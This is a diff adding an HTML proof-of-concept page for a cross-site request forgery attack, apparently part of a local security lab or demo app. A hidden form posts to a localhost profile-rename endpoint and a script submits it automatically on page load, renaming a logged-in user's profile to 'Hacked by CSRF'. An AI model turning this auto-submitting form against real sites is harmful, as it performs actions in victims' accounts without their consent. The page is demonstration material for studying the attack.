@@ -1,0 +1,45 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>CSRF Attack PoC</title>
+  <style>
+    body {
+      margin: 0;
+      font-family: "Segoe UI", sans-serif;
+      background: linear-gradient(135deg,#ff512f,#dd2476);
+      color: #fff;
+      height: 100vh;
+      display: flex; align-items: center; justify-content: center;
+    }
+    .box {
+      background: rgba(255,255,255,0.1);
+      padding: 30px;
+      border-radius: 16px;
+      text-align: center;
+      backdrop-filter: blur(14px);
+      width: 380px;
+      box-shadow: 0 12px 30px rgba(0,0,0,0.3);
+    }
+    h3 { margin: 0 0 12px; font-size: 22px; }
+    p { font-size: 13px; margin-bottom: 20px; }
+  </style>
+</head>
+<body>
+<div style="position:fixed;top:16px;left:16px;z-index:50">
+  <a href="/home" style="
+    text-decoration:none;padding:8px 12px;border-radius:10px;
+    background:linear-gradient(90deg,#7b61ff,#5ac8fa);color:#0b1220;
+    font-weight:800;box-shadow:0 10px 20px rgba(123,97,255,.35);">Home</a>
+</div>
+  <div class="box">
+    <h3>CSRF Attack PoC</h3>
+    <p>If the victim is logged in, their profile will be changed automatically.</p>
+    <form id="f" method="POST" action="http://localhost:8080/profile/rename">
+      <input type="hidden" name="username" value="alice">
+      <input type="hidden" name="newName" value="Hacked by CSRF">
+    </form>
+    <script>document.getElementById('f').submit();</script>
+  </div>
+</body>
+</html>
